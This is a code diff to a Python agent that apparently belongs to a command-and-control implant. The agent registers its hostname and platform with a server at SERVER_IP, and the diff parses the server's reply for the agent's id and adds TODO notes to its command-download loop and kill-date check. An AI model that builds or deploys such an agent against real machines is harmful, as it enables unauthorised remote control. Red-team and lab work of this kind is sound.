@@ -104,6 +104,7 @@ def register():
     :return:
     """
     url = 'http://{0}:8080/register_agent'.format(SERVER_IP)
+    global agent_id
 
     try:
         req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
@@ -112,7 +113,9 @@ def register():
         response = str(req.data.decode('utf-8'))
 
         if req.status == 200:
-            print('[+] ' + response)
+            response_split = response.split('.')
+            agent_id = response_split[1]
+            print('[+] ' + response_split[0])
 
     except MaxRetryError:
         sys.exit('[+] Agent failed to register with server after 3 retries\n[+] Agent stopped!!')
@@ -167,6 +170,7 @@ def download_and_run_commands():
             for i, command in enumerate(agent_commands):
                 if command is '':
                     continue
+                # TODO Remove agent_id initialization
                 if i == 0:
                     agent_id = int(agent_id)
                     continue
@@ -240,6 +244,7 @@ def confirm_kill():
     Compares the Agent kill datetime with the current datetime and kills the Agent if time is due.
     :return:
     """
+    # TODO Invoke this method somewhere
     if VERBOSE:
         print('[+] Checking kill datetime')
     global kill_date_string
